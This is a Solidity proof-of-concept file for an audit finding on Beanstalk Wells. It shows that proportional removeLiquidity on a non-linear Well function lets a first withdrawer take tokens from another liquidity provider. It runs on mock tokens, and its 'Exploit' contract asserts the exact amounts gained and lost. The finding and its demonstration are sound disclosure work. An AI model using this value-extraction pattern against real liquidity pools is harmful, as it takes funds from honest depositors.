// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*//////////////////////////////////////////////////////////////////////////
    Beanstalk Wells (Basin) — removeLiquidity is not correct for generalized
    (non-linear) Well functions
    Finding 18433 (Cyfrin, Hans) — HIGH

    Root cause: Well.removeLiquidity computes each output with a fixed PROPORTIONAL
    split, `lpAmountIn * reserves[i] / lpTokenSupply`, which is only value-preserving
    when the Well function is linear (constant-product in the balanced sense). For a
    non-linear Well function (the finding uses Numoen's quadratic curve), proportional
    withdrawal breaks the Well's invariant, so one liquidity provider withdrawing
    normally extracts value from another — a direct loss of funds for LPs.

    This file is a self-contained, cheatcode-free reduction. The Well.addLiquidity /
    removeLiquidity bodies are copied VERBATIM from BeanstalkFarms/Wells commit
    e5441fc (src/Well.sol), and the QuadraticWell Well function is copied VERBATIM
    from the finding's PoC. Two LPs add liquidity; the first withdrawer (Exploit)
    walks away with MORE than it deposited, and the honest second LP recovers LESS —
    a measurable token-denominated loss (no fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWellFunction {
    function calcReserve(uint[] memory reserves, uint j, uint lpTokenSupply, bytes calldata data)
        external
        view
        returns (uint reserve);
    function calcLpTokenSupply(uint[] memory reserves, bytes calldata data)
        external
        view
        returns (uint lpTokenSupply);
}

struct Call {
    address target;
    bytes data;
}

/// @dev Minimal integer square root (Babylonian) — the finding's QuadraticWell
///      relies on LibMath.sqrt; kept minimal but faithful to the value.
library LibMath {
    function sqrt(uint a) internal pure returns (uint z) {
        if (a == 0) return 0;
        z = (a + 1) / 2;
        uint y = a;
        while (z < y) {
            y = z;
            z = (a / z + z) / 2;
        }
        return y;
    }
}

/// @dev Minimal ERC20 used as the two Well tokens.
contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev VERBATIM from the finding's PoC (Numoen-style quadratic Well function).
///      s = b_0 - (PRICE_BOUND - b_1/2)^2 / PRECISION.
contract QuadraticWell is IWellFunction {
    using LibMath for uint;

    uint constant PRECISION = 1e18; //@audit-info assume 1:1 upperbound for this well
    uint constant PRICE_BOUND = 1e18;

    /// @dev s = b_0 - (p_1^2 - b_1/2)^2
    function calcLpTokenSupply(uint[] memory reserves, bytes calldata)
        external
        pure
        override
        returns (uint lpTokenSupply)
    {
        uint delta = PRICE_BOUND - reserves[1] / 2;
        lpTokenSupply = reserves[0] - delta * delta / PRECISION;
    }

    /// @dev b_0 = s + (p_1^2 - b_1/2)^2
    /// @dev b_1 = (p_1^2 - (b_0 - s)^(1/2))*2
    function calcReserve(uint[] memory reserves, uint j, uint lpTokenSupply, bytes calldata)
        external
        pure
        override
        returns (uint reserve)
    {
        if (j == 0) {
            uint delta = PRICE_BOUND * PRICE_BOUND - PRECISION * reserves[1] / 2;
            return lpTokenSupply + delta * delta / PRECISION / PRECISION / PRECISION;
        } else {
            uint delta = (reserves[0] - lpTokenSupply) * PRECISION;
            return (PRICE_BOUND * PRICE_BOUND - delta.sqrt() * PRECISION) * 2 / PRECISION;
        }
    }

    /// @dev residual of the Well's constant function; 0 iff the invariant holds.
    function wellInvariant(uint s, uint[] memory reserves) external pure returns (int256) {
        uint delta = PRICE_BOUND - reserves[1] / 2;
        int256 expectedS = int256(reserves[0]) - int256(delta * delta / PRECISION);
        return int256(s) - expectedS;
    }
}

/// @notice Reduced Well. addLiquidity / removeLiquidity copied VERBATIM from
///         BeanstalkFarms/Wells commit e5441fc, src/Well.sol.
contract Well is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    IERC20[] private _tokensArr;
    IWellFunction public wf;
    uint256[] private _reserves;
    bool private _entered;

    error SlippageOut(uint256 amountOut, uint256 minAmountOut);
    error InvalidReserves();

    modifier nonReentrant() {
        require(!_entered, "REENTRANCY");
        _entered = true;
        _;
        _entered = false;
    }

    constructor(IERC20 token0, IERC20 token1, IWellFunction _wf) {
        _tokensArr.push(token0);
        _tokensArr.push(token1);
        wf = _wf;
        _reserves.push(0);
        _reserves.push(0);
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function _mint(address to, uint256 amt) internal {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function _burn(address from, uint256 amt) internal {
        totalSupply -= amt;
        balanceOf[from] -= amt;
    }

    function tokens() public view returns (IERC20[] memory ts) {
        ts = _tokensArr;
    }

    function wellFunction() public view returns (Call memory c) {
        c.target = address(wf);
        c.data = "";
    }

    function getReserves() external view returns (uint[] memory reserves) {
        reserves = _getReserves(_tokensArr.length);
    }

    function _getReserves(uint n) internal view returns (uint[] memory reserves) {
        reserves = new uint[](n);
        for (uint i; i < n; ++i) reserves[i] = _reserves[i];
    }

    function _setReserves(IERC20[] memory _tokens, uint[] memory reserves) internal {
        for (uint i; i < reserves.length; ++i) {
            if (reserves[i] > _tokens[i].balanceOf(address(this))) revert InvalidReserves();
        }
        for (uint i; i < reserves.length; ++i) _reserves[i] = reserves[i];
    }

    function _updatePumps(uint n) internal view returns (uint[] memory reserves) {
        reserves = _getReserves(n);
    }

    function _calcLpTokenSupply(Call memory _wellFunction, uint[] memory reserves)
        internal
        view
        returns (uint lpTokenSupply)
    {
        lpTokenSupply = IWellFunction(_wellFunction.target).calcLpTokenSupply(reserves, _wellFunction.data);
    }

    //////////////////// ADD LIQUIDITY (VERBATIM src/Well.sol L393-424) ////////////////////
    // addLiquidity mints LP using the Well function -> the invariant HOLDS on add.

    function addLiquidity(uint[] memory tokenAmountsIn, uint minLpAmountOut, address recipient)
        external
        nonReentrant
        returns (uint lpAmountOut)
    {
        IERC20[] memory _tokens = tokens();
        uint[] memory reserves = _updatePumps(_tokens.length);

        for (uint i; i < _tokens.length; ++i) {
            if (tokenAmountsIn[i] == 0) continue;
            _tokens[i].transferFrom(msg.sender, address(this), tokenAmountsIn[i]);
            reserves[i] = reserves[i] + tokenAmountsIn[i];
        }

        lpAmountOut = _calcLpTokenSupply(wellFunction(), reserves) - totalSupply;
        if (lpAmountOut < minLpAmountOut) revert SlippageOut(lpAmountOut, minLpAmountOut);

        _mint(recipient, lpAmountOut);
        _setReserves(_tokens, reserves);
    }

    //////////////////// REMOVE LIQUIDITY: BALANCED (VERBATIM src/Well.sol L440-463) ////////////////////
    // removeLiquidity pays out PROPORTIONALLY, ignoring the Well function -> breaks the invariant.

    function removeLiquidity(uint lpAmountIn, uint[] calldata minTokenAmountsOut, address recipient)
        external
        nonReentrant
        returns (uint[] memory tokenAmountsOut)
    {
        IERC20[] memory _tokens = tokens();
        uint[] memory reserves = _updatePumps(_tokens.length);
        uint lpTokenSupply = totalSupply;

        tokenAmountsOut = new uint[](_tokens.length);
        _burn(msg.sender, lpAmountIn);
        for (uint i; i < _tokens.length; ++i) {
            tokenAmountsOut[i] = (lpAmountIn * reserves[i]) / lpTokenSupply; // @> VULN: fixed proportional split assumes a LINEAR Well function; wrong for non-linear curves -> LP value mis-distributed
            if (tokenAmountsOut[i] < minTokenAmountsOut[i]) revert SlippageOut(tokenAmountsOut[i], minTokenAmountsOut[i]);
            _tokens[i].transfer(recipient, tokenAmountsOut[i]);
            reserves[i] = reserves[i] - tokenAmountsOut[i];
        }

        _setReserves(_tokens, reserves);
    }
}

/// @dev Honest liquidity provider (the victim): adds and later withdraws.
contract HonestLp {
    Well public well;
    MockToken public t0;
    MockToken public t1;

    constructor(Well _well, MockToken _t0, MockToken _t1) {
        well = _well;
        t0 = _t0;
        t1 = _t1;
        t0.approve(address(_well), type(uint256).max);
        t1.approve(address(_well), type(uint256).max);
    }

    function add(uint256 a0, uint256 a1) external {
        uint[] memory amts = new uint[](2);
        amts[0] = a0;
        amts[1] = a1;
        well.addLiquidity(amts, 0, address(this));
    }

    function removeAll() external {
        uint[] memory minOut = new uint[](2);
        well.removeLiquidity(well.balanceOf(address(this)), minOut, address(this));
    }
}

/// @notice Beneficiary LP (first withdrawer). Adds at a ratio, withdraws
///         proportionally on the non-linear Well, and extracts value from the
///         honest LP because removeLiquidity ignores the Well function.
contract Exploit {
    MockToken public token0;
    MockToken public token1;
    QuadraticWell public qwell;
    Well public well;
    HonestLp public victim;
    address public attacker;

    // measured outcomes
    uint256 public victimDeposit0 = 1e18;
    uint256 public victimDeposit1 = 1e18;
    uint256 public attackerDeposit0 = 2e18;
    uint256 public attackerDeposit1 = 1e18;
    uint256 public victimOut0;
    uint256 public victimOut1;
    uint256 public attackerOut0;
    uint256 public attackerOut1;

    constructor() {
        attacker = msg.sender;
        token0 = new MockToken(); // CREATE nonce 1
        token1 = new MockToken(); // CREATE nonce 2
        qwell = new QuadraticWell(); // CREATE nonce 3
        well = new Well(IERC20(address(token0)), IERC20(address(token1)), IWellFunction(address(qwell))); // CREATE nonce 4
        victim = new HonestLp(well, token0, token1); // CREATE nonce 5

        // Fund the honest LP with exactly its deposit; fund the attacker (this) too.
        token0.mint(address(victim), victimDeposit0);
        token1.mint(address(victim), victimDeposit1);
        token0.mint(address(this), attackerDeposit0);
        token1.mint(address(this), attackerDeposit1);
        token0.approve(address(well), type(uint256).max);
        token1.approve(address(well), type(uint256).max);
    }

    function run() external {
        // 1. Honest LP adds [1,1] -> receives 0.75e18 LP; reserves (1,1), invariant holds.
        victim.add(victimDeposit0, victimDeposit1);

        // 2. Attacker adds [2,1] -> reserves (3,2), supply 3e18, attacker LP 2.25e18.
        uint[] memory amts = new uint[](2);
        amts[0] = attackerDeposit0;
        amts[1] = attackerDeposit1;
        well.addLiquidity(amts, 0, address(this));

        // 3. Attacker (first withdrawer) removes ALL its LP proportionally.
        uint[] memory minOut = new uint[](2);
        well.removeLiquidity(well.balanceOf(address(this)), minOut, address(this));
        attackerOut0 = token0.balanceOf(address(this));
        attackerOut1 = token1.balanceOf(address(this));

        // 4. Honest LP withdraws its LP -> recovers LESS than it deposited.
        victim.removeAll();
        victimOut0 = token0.balanceOf(address(victim));
        victimOut1 = token1.balanceOf(address(victim));

        // Profit is left on this Exploit: it entered run() with 1e18 token1
        // (constructor funding) and now holds 1.5e18 -> +0.5e18 net gain, exactly
        // the honest LP's token1 loss. Measured as this contract's token1 delta.

        // ---- HARM ASSERTIONS ----
        // Honest LP deposited [1,1] but recovers [0.75, 0.5] -> loses [0.25, 0.5].
        require(victimOut0 == 0.75e18, "victim token0 out unexpected");
        require(victimOut1 == 0.5e18, "victim token1 out unexpected");
        require(victimOut0 < victimDeposit0, "victim did not lose token0");
        require(victimOut1 < victimDeposit1, "victim did not lose token1");

        // Attacker deposited [2,1] but recovers [2.25, 1.5] -> gains [0.25, 0.5]
        // (exactly the honest LP's loss). Proportional removeLiquidity on a
        // non-linear Well transferred value between LPs.
        require(attackerOut0 == 2.25e18, "attacker token0 out unexpected");
        require(attackerOut1 == 1.5e18, "attacker token1 out unexpected");
        require(attackerOut0 - attackerDeposit0 == victimDeposit0 - victimOut0, "token0 loss/gain mismatch");
        require(attackerOut1 - attackerDeposit1 == victimDeposit1 - victimOut1, "token1 loss/gain mismatch");

        // Net token1 profit retained on this contract == 0.5e18 (the theft).
        require(token1.balanceOf(address(this)) - attackerDeposit1 == 0.5e18, "net token1 profit != 0.5e18");
    }
}
